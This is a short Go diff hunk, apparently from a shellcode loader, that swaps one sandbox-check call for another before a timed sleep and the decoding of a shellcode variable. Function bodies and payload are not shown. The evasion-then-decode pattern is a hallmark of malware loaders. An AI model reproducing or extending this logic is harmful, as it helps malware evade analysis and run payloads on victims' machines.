@@ -16,7 +16,7 @@ var (
 )
 
 func main() {
-	sandbox.IFlanguage()
+	sandbox.See_through()
 	time.Sleep(10 * time.Second)
 
 	shellcode :=sdec(sc)
